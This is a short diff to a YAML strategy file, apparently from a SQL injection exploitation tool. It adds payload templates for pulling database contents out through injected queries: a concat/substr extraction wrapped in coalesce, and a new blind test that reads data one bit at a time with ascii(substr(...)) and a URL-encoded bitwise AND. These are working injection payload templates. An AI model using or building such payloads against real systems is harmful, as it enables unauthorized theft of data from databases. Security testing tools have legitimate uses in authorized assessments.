@@ -105,10 +105,13 @@ strategy:
    (
        select concat(
            '${lead}',
-           substr(
-               (${injection}),
-               ${window.char},
-               ${capacity}
+           coalesce(
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               ),
+               '${trail_sql}'
            )
        )
    )
@@ -140,6 +143,15 @@ strategy:
 
  binary:
   test:
+   bit: |
+    ascii(
+        substr(
+            ${injection},
+            ${window.char},
+            1
+        )
+    )
+    %26${bit}
    bin: |
     substr(
         (${injection}),
